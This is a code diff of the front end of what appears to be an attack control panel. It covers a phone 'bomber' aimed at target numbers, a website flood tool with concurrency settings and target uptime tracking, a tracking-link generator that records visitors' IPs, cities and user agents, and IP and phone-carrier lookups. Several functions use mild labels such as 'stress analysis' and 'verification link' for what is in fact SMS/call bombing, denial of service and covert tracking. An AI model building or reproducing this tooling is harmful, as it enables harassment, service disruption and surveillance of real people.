-            // Rocket Launch Sequence
-            rocket.style.display = 'block';
-            rocket.style.animation = 'launch-realistic 1.5s forwards ease-in';
-            
-            setTimeout(() => {
-                const rect = rocket.getBoundingClientRect();
-                createExplosion(window.innerWidth/2, window.innerHeight * 0.2, 150);
-                rocket.style.display = 'none';
-                rocket.style.animation = '';
-            }, 1400);
-
-            addLog(`Initializing payload deployment for ${phone.split(/[,\n]+/).length} targets...`, 'info');
-
-            try {
-                const response = await fetch('/attack', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({phone, amount, services})
-                });
-                
-                if (response.status === 429) {
-                    addLog('System overload! Concurrent operations locked.', 'error');
-                } else {
-                    const data = await response.json();
-                    if (data.success) {
-                        addLog('Mission control: ROCKETS AWAY. Tracking impact...', 'success');
-                        pollStatus();
-                    } else {
-                        addLog('Launch aborted: ' + data.error, 'error');
-                        resetButton();
-                    }
-                }
-            } catch (err) {
-                addLog('Telemetry failure: ' + err.message, 'error');
-                resetButton();
-            }
-        };
-
-        function resetButton() {
-            isAttacking = false;
-            submitBtn.disabled = false;
-            submitBtn.innerHTML = '<i class="bi bi-lightning-charge-fill me-2"></i>INITIALIZE DEPLOYMENT';
-        }
-
-        async function pollStatus() {
-            const interval = setInterval(async () => {
+        // --- Status Polling ---
+        function startStatusPolling() {
+            if (currentStatusInterval) clearInterval(currentStatusInterval);
+            currentStatusInterval = setInterval(async () => {
                 try {
-                    const response = await fetch('/status');
-                    const data = await response.json();
-                    
-                    if (parseInt(data.success) > parseInt(successStat.innerText)) {
-                        const rect = successStat.getBoundingClientRect();
-                        createExplosion(rect.left + rect.width/2, rect.top + rect.height/2, 40);
-                    }
-                    
-                    successStat.innerText = data.success;
-                    failedStat.innerText = data.failed;
+                    const res = await fetch('/status');
+                    const data = await res.json();
                     
                     if (data.logs && data.logs.length > 0) {
-                        data.logs.forEach(log => addLog(log.msg, log.type));
+                        data.logs.forEach(l => addLog(l.msg, l.type));
+                        if (data.type === 'bomber' && data.logs.some(l => l.msg.includes('Hits'))) {
+                            triggerRocket();
+                        }
                     }
 
-                    if (!data.active) {
-                        clearInterval(interval);
-                        resetButton();
-                        addLog('Mission objectives finalized. Standing down.', 'info');
-                        const rect = successStat.getBoundingClientRect();
-                        for(let i=0; i<3; i++) setTimeout(() => createExplosion(rect.left + rect.width/2, rect.top + rect.height/2, 60), i*300);
+                    if (data.active) {
+                        document.getElementById('btn-stop-global').style.display = 'block';
+                        if (data.type === 'flood') {
+                            document.getElementById('flood-packet-count').innerText = data.flood_requests + " PACKETS";
+                            const dot = document.getElementById('uptime-dot');
+                            dot.className = 'uptime-meter ' + (data.target_uptime ? 'uptime-online' : 'uptime-offline');
+                            document.getElementById('uptime-text').innerText = "Target Status: " + (data.target_uptime ? 'ONLINE' : 'OFFLINE');
+                        }
+                    } else {
+                        document.getElementById('btn-stop-global').style.display = 'none';
+                        clearInterval(currentStatusInterval);
+                        addLog("OPERATION COMPLETED.", "info");
                     }
-                } catch (err) {
-                    console.error('Lost signal:', err);
+                } catch (e) {
+                    console.error("Status poll failed", e);
                 }
-            }, 1500);
+            }, 1000);
+        }
+
+        // --- Bomber Logic ---
+        async function startBomber() {
+            const phone = document.getElementById('bomber-target').value;
+            const amount = document.getElementById('bomber-amount').value;
+            const services = Array.from(document.getElementById('bomber-services').selectedOptions).map(o => o.value);
+
+            addLog("INITIALIZING SIGNAL DISPATCH ON TARGET NODES...", "info");
+            
+            const res = await fetch('/dispatch/signal', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone, amount, services })
+            });
+            const data = await res.json();
+            if (data.success) {
+                addLog("DISPATCH SEQUENCE ENGAGED.", "success");
+                startStatusPolling();
+            } else {
+                addLog("DISPATCH FAILED: " + data.error, "error");
+            }
+        }
+
+        // --- Flood Logic ---
+        async function startFlood() {
+            const url = document.getElementById('flood-url').value;
+            const duration = document.getElementById('flood-duration').value;
+            const concurrency = document.getElementById('flood-concurrency').value;
+
+            addLog("EXECUTING NETWORK STRESS ANALYSIS...", "warn");
+            
+            const res = await fetch('/analyze/stress', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ url, duration, concurrency })
+            });
+            const data = await res.json();
+            if (data.success) {
+                addLog("STRESS SEQUENCE ACTIVE.", "success");
+                startStatusPolling();
+            } else {
+                addLog("STRESS FAILED: " + data.error, "error");
+            }
+        }
+
+        // --- Stop Logic ---
+        async function stopCurrentOp() {
+            addLog("SENDING ABORT SIGNAL...", "warn");
+            const res = await fetch('/command/stop', { method: 'POST' });
+            const data = await res.json();
+            if (data.success) {
+                addLog("ABORT COMMAND CONFIRMED.", "error");
+            }
+        }
+
+        // --- Tracker Logic ---
+        async function generateLink() {
+            const target = document.getElementById('tracker-target').value;
+            const res = await fetch('/verify/generate', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target })
+            });
+            const data = await res.json();
+            activeLinkID = data.id;
+            document.getElementById('generated-link').value = data.link;
+            document.getElementById('generated-link-area').classList.remove('d-none');
+            addLog("VERIFICATION LINK GENERATED: " + data.id, "success");
+            
+            // Start polling tracker logs
+            setInterval(async () => {
+                if (!activeLinkID) return;
+                const r = await fetch('/verify/logs/' + activeLinkID);
+                const d = await r.json();
+                updateTrackerTable(d.clicks);
+            }, 5000);
+        }
+
+        function updateTrackerTable(clicks) {
+            const body = document.getElementById('tracker-logs-body');
+            if (!clicks || clicks.length === 0) return;
+            body.innerHTML = '';
+            clicks.reverse().forEach(c => {
+                const row = `<tr>
+                    <td>${c.timestamp.split('T')[1].split('.')[0]}</td>
+                    <td>${c.ip}</td>
+                    <td>${c.geo.city || 'Capturing...'}</td>
+                    <td>${c.user_agent.substring(0, 30)}...</td>
+                </tr>`;
+                body.innerHTML += row;
+            });
+        }
+
+        function copyLink() {
+            const el = document.getElementById('generated-link');
+            el.select();
+            document.execCommand('copy');
+            addLog("LINK COPIED TO CLIPBOARD.", "info");
+        }
+
+        // --- OSINT Logic ---
+        async function inquiryIP() {
+            const ip = document.getElementById('osint-ip').value;
+            if (!ip) return;
+            addLog("INQUIRING IP INTEL: " + ip, "info");
+            const res = await fetch('/inquiry/ip/' + ip);
+            const data = await res.json();
+            document.getElementById('osint-result').classList.remove('d-none');
+            document.getElementById('osint-result-pre').innerText = JSON.stringify(data, null, 2);
+        }
+
+        async function inquiryPhone() {
+            const phone = document.getElementById('osint-phone').value;
+            if (!phone) return;
+            addLog("INQUIRING CARRIER LOGIC: " + phone, "info");
+            const res = await fetch('/inquiry/carrier/' + phone);
+            const data = await res.json();
+            document.getElementById('osint-result').classList.remove('d-none');
+            document.getElementById('osint-result-pre').innerText = JSON.stringify(data, null, 2);
+        }
+
+        // --- Rocket Animation ---
+        function triggerRocket() {
+            const rocket = document.getElementById('rocket-container');
+            rocket.style.bottom = '120%';
+            setTimeout(() => {
+                rocket.style.transition = 'none';
+                rocket.style.bottom = '-100px';
+                setTimeout(() => {
+                    rocket.style.transition = 'bottom 2s cubic-bezier(0.47, 0, 0.745, 0.715)';
+                }, 100);
+            }, 2100);
         }
     </script>
 </body>
